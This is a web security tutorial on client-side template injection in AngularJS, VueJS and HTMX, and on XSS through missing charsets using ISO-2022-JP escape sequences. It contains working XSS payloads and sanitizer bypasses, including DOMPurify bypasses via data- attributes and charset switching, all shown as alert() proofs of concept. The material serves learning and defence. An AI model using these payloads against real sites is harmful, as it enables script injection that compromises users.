# CST Injection ( CSTI )

## Client-Side Template Injection <a href="#client-side-template-injection" id="client-side-template-injection"></a>

Modern frontend frameworks use template engines to bind user data to HTML. While this helps with escaping special characters, it can also enable injection if the template syntax itself is exposed.

Below are practical examples for popular frameworks.

[**AngularJS**](https://docs.angularjs.org/guide/templates)

AngularJS is a common frontend framework. It uses special attributes and syntax to add interactivity, but this can enable HTML/text injections that execute arbitrary JavaScript if not properly handled.\
A key point: these injections only work if an element has an `ng-app` attribute. Once enabled, it opens up multiple attack paths.

When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.

**Example payloads (all trigger `alert`):**

```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>

<body ng-app>
  <!-- Text injection -->
  {{constructor.constructor('alert(1)')()}}
  <!-- Attribute injection -->
  <ANY ng-init="constructor.constructor('alert(2)')()"></ANY>
  <!-- Filter bypass (even DOMPurify!) -->
  <ANY data-ng-init="constructor.constructor('alert(3)')()"></ANY>
  <ANY class="ng-init:constructor.constructor('alert(4)')()"></ANY>
  <ANY class="AAA;ng-init:constructor.constructor('alert(5)')()"></ANY>
  <ANY class="AAA!ng-init:constructor.constructor('alert(6)')()"></ANY>
  <ANY class="AAA♩♬♪ng-init:constructor.constructor('alert(7)')()"></ANY>
  <!-- Dynamic content insertion also vulnerable (only during load) -->
  <script>
    document.body.innerHTML += `<ANY ng-init="constructor.constructor('alert(8)')()"></ANY>`;
  </script>
</body>
<!-- Everything also works under `data-ng-app`, fully bypassing DOMPurify! -->
<div data-ng-app>
  ...
  <b data-ng-init="constructor.constructor('alert(9)')()"></b>
</div>
```

**Note:**\
Older AngularJS versions had a sandbox that limited this, but all versions have sandbox bypasses now — see: [PortSwigger AngularJS sandbox escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes).

**Newer versions** of *Angular (v2+)* instead of *AngularJS (v1)* are not vulnerable in this way.

**Note**: Injecting content with `.innerHTML` does not always work, because it is only triggered *when AngularJS loads*. If you inject content later from a fetch, for example, it would not trigger even if a parent contains `ng-app`.

You may still be able to exploit this by slowing down the AngularJS script loading by **filling up the browser's connection pool**. [See this challenge writeup for details](https://blog.ryotak.net/post/dom-based-race-condition/).

[**VueJS**](https://vuejs.org/guide/essentials/template-syntax.html)

VueJS template injection is possible via similar constructor tricks:

```markup
<script src="https://cdn.jsdelivr.net/npm/vue@2.5.13/dist/vue.js"></script>

<div id="app">
  <p>{{this.constructor.constructor('alert(1)')()}}</p>
  <p>{{this.$el.ownerDocument.defaultView.alert(2)}}</p>
</div>
<script>
  new Vue({
    el: "#app",
  });
</script>
```

[![Logo](https://portswigger.net/content/images/logos/favicon.ico)](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)[Incredibly detailed research into VueJS payloads and filter bypasses](https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets)

[**HTMX**](https://htmx.org/docs/)

HTMX uses attributes for interactivity and can also be abused:

```markup
<script src="https://unpkg.com/htmx.org@1.9.12"></script>

<!-- Old syntax, simple eval -->
<img src="x" hx-on="error:alert(1)" />
<!-- Normally impossible elements allow injecting JavaScript into eval'ed function! -->
<meta hx-trigger="x[1)}),alert(2);//]" />
<div hx-disable>
  <!-- Inside hx-disable, new syntax still works -->
  <img src="x" hx-on:error="alert(3)" />
  <!-- Everything can be prefixed with data-, bypassing DOMPurify! -->
  <img src="x" data-hx-on:error="alert(4)" />
</div>
```

#### Alternative Charsets <a href="#alternative-charsets" id="alternative-charsets"></a>

[Source explaining XSS tricks when a charset definition is missing from a response, abusing ISO-2022-JP](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)

**Note**: In this section, some ESC characters are replaced with `\x1b` for clarity. You can copy a real ESC control character from the code block below:

```

```

If a response contains *any* of the following two lines, it is *safe* from the following attack.

```http
Content-Type: text/html; charset=utf-8
...
<meta charset="UTF-8">
```

If the charset is missing, browsers will try to detect the encoding automatically. This can allow unexpected behavior, especially with encodings like **ISO-2022-JP**, which uses escape sequences to switch character sets mid-response. The ISO-2022-JP encoding has the following special escape sequences:

<table><thead><tr><th>Escape Sequence</th><th>Copy</th><th>Meaning</th></tr></thead><tbody><tr><td><code>\x1b(B</code></td><td><p></p><pre><code>(B
</code></pre></td><td>switch to <em>ASCII</em> (default)</td></tr><tr><td><code>\x1b(J</code></td><td><p></p><pre><code>(J
</code></pre></td><td>switch to <em>JIS X 0201 1976</em> (backslash swapped)</td></tr><tr><td><code>\x1b$@</code></td><td><p></p><pre><code>$@
</code></pre></td><td>switch to <em>JIS X 0201 1978</em> (2 bytes per char)</td></tr><tr><td><code>\x1b$B</code></td><td><p></p><pre><code>$B
</code></pre></td><td>switch to <em>JIS X 0201 1983</em> (2 bytes per char)</td></tr></tbody></table>

These sequences can be used at any point in the HTML context (not JavaScript) and instantly switch how the browser maps bytes to characters. *JIS X 0201 1976* is almost the same as ASCII, except for `\` being replaced with `¥`, and `~` replaced with `‾`.

![](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252FdOiOuFJBrFgovk90KxJw%252Fimage.png%3Falt%3Dmedia%26token%3D971a8d2b-a29b-42cb-8759-88ddc30fde51\&width=768\&dpr=4\&quality=100\&sign=a7bf5e18\&sv=1)

**1. Negating Backslash Escaping**

For example, the **JIS X 0201 1976** charset is similar to ASCII but replaces `\` with `¥` and `~` with `‾`.

This means if you inject the escape sequence `\x1b(J` into a script, it switches the encoding so that backslashes no longer behave as expected. This can bypass protections that rely on backslash escaping to sanitize quotes or special characters inside `<script>` blocks.

![1. Input in HTML (search) and JavaScript string (lang) escaped correctly](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252F0mP8oHCgLRgfrGUt7E8h%252Fimage.png%3Falt%3Dmedia%26token%3D3d538b19-877a-441d-89e0-664a4c5332bd\&width=768\&dpr=4\&quality=100\&sign=58bbbf18\&sv=1)                                                                                                                                        &#x20;

![2. Bypass using JIS X 0201 1976 escape sequence in search, ignoring backslashes and escaping with quote](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252FcGVq4qPzDzJXUjfODMc5%252Fimage.png%3Falt%3Dmedia%26token%3Df145c319-8940-40c5-90d1-fbe408726699\&width=768\&dpr=4\&quality=100\&sign=26ff0ef9\&sv=1)                                                                                                                                                   &#x20;

**2. Breaking HTML Context**

The **JIS X 0201 1978** and **JIS X 0201 1983** charsets work differently. They can merge pairs of bytes into single characters, obfuscating the intended meaning of the following HTML or attribute content. This continues until another escape sequence resets the encoding back to ASCII.

One example is manipulating an attribute value that should be closed with a double quote (`"`). By inserting an encoding switch, the closing quote becomes invalid, and everything after it merges into the attribute value.

![In markdown, our image alt text ends up in the \<img alt= attribute](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252FHk6phAXAZvZtA4we5cHu%252Fimage%2520%2828%29.png%3Falt%3Dmedia%26token%3D53f6286a-ca9f-4083-b94d-51981b93259d\&width=768\&dpr=4\&quality=100\&sign=6ddc2f02\&sv=1)                                                                                                                                &#x20;

![Writing the JIS X 0201 1978 escape sequence obfuscates the succeeding characters](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252Fb0kjJsPz19X0IZ1I2pBl%252Fimage.png%3Falt%3Dmedia%26token%3D2862a034-6e4a-4134-96bb-4b49ba7cdfa4\&width=768\&dpr=4\&quality=100\&sign=226cf00e\&sv=1)

By later in a **different context** ending the obfuscation with a reset to *ASCII* escape sequence, we will still be in the attribute context for HTML's sake. The text that was sanitized as text before, is now put into an attribute which can cause all sorts of issues.

![Text in markdown ends obfuscation using ASCII escape sequence, continuing the attribute](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252F87KiAyNLUAWLqH0b36hG%252Fimage%2520%2829%29.png%3Falt%3Dmedia%26token%3Dc42dfb21-3738-444e-8426-52daaa3ef4e1\&width=768\&dpr=4\&quality=100\&sign=f6ace979\&sv=1)

With the next image tag being created, it creates an unexpected scenario where the opening tag is actually still part of the attribute, and the opening of its first attribute instead closes the existing one.

![Later image tag still part of the exploited attribute, only closed after trying to open first attribute](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252FkKsUJpoeV94QmOm0qhG0%252Fimage.png%3Falt%3Dmedia%26token%3D3b33e857-ff34-4e8a-bbd1-548d903bd58c\&width=768\&dpr=4\&quality=100\&sign=47e42f3f\&sv=1)

The `1.png` string is now syntax-highlighted as red, meaning it is now the **name of an attribute** instead of a value. If we write `onerror=alert(1)//` here instead, a malicious attribute is added that will execute JavaScript without being sanitized:

![Adding malicious attribute after context confusion creates successful XSS payload](https://book.jorianwoltjer.com/~gitbook/image?url=https%3A%2F%2F3698848315-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F677wrA8ZfiPs1U4l5uR6%252Fuploads%252FLEVPlcKEk4nCt0jfw7Uy%252Fimage%2520%2830%29.png%3Falt%3Dmedia%26token%3Da5fd32f5-0986-4415-ae09-d946daec108e\&width=768\&dpr=4\&quality=100\&sign=24b06602\&sv=1)

**Note**: It is *not possible* to abuse *JIS X 0201 1978* or *JIS X 0201 1983* (2 bytes per char) encoding to write arbitrary ASCII characters instead of Unicode garbage. Only some Japanese characters and ASCII full-width alternatives can be created ([source](https://en.wikipedia.org/wiki/JIS_X_0208)), except for two unique cases that can generate a `$` and `(` character found using this fuzzer: <https://shazzer.co.uk/vectors/66efda1eacb1e3c22aff755c>

This technique can also trivially **bypass any server-side** XSS protection (eg. DOMPurify) such as in the following challenge:

<https://gist.github.com/kevin-mizu/9b24a66f9cb20df6bbc25cc68faf3d71>

```markup
<img src="src\x1b$@">text\x1b(B<img src="onerror=alert()//">
```
